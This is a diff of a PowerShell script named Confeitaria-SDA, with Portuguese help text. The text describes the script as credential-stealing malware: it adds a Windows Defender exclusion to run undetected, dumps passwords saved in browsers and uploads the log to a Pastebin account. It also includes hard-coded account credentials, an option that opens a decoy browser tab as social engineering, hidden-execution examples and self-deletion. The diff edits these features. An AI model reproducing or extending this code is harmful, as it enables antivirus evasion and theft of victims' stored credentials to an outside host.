@@ -12,7 +12,7 @@
    Este script adiciona uma exclusao (pasta TEMP) ao windows defender
    para poder executar commandos sem ser detectado. Depois faz o dump
    de credenciais armazenadas nos browsers e envia o logfile para o
-   site www.pastebin.com\u\pedro_testing para revermos as capturas.
+   site www.pastebin.com/u/pedro_testing para revermos as capturas.
 
 .NOTES
    Para aceder as credenciais leaked:
@@ -26,14 +26,13 @@
    sera detectado se o alvo estiver outro antivirus instalado.
 
 .Parameter PasteBinUserName
-   PasteBin website username access (default: root-3xp10it)
+   PasteBin website username access (default: pedro_testing)
 
 .Parameter PasteBinPassword
    PasteBin website password access (default: angelapastebin)
 
 .Parameter URI
-   Open URL on a new web browser tab while executing the
-   rest of cmdlet code in background (social engineering)
+   Open URL on a new web browser tab (social engineering)
 
 .Parameter AutoDelete
    Auto-Delete this cmdlet in the end (default: true)
@@ -42,6 +41,10 @@
    Execute Confeitaria-SDA (execution visible)
    PS C:\> powershell -file Confeitaria-SDA.ps1
   
+.EXAMPLE
+   Execute Confeitaria-SDA (execution visible) and open a new web browser tab in URL
+   PS C:\> powershell -file Confeitaria-SDA.ps1 -Uri "https://pastebin.com/u/pedro_testing"
+
 .EXAMPLE
    Silent execute Confeitaria-SDA (background process)
    PS C:\> Start-Process -WindowStyle hidden powershell -ArgumentList "-file Confeitaria-SDA.ps1"
@@ -83,9 +86,9 @@ write-host ""
 $Ipath = (Get-Location).Path
 $ErrorActionPreference = "SilentlyContinue"
 
-## Open|Start new web browser tab in
-# $URI webpage to fake a legit action
-Start "$URI"
+## Open|Start a new web browser tab in
+# $URI web page to fake a legit action
+Start-Process "$URI" -WindowStyle Maximized
 
 ## Make sure shell is running with administrator privileges before continue
 If([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544") -iNotMatch '^(True)$')
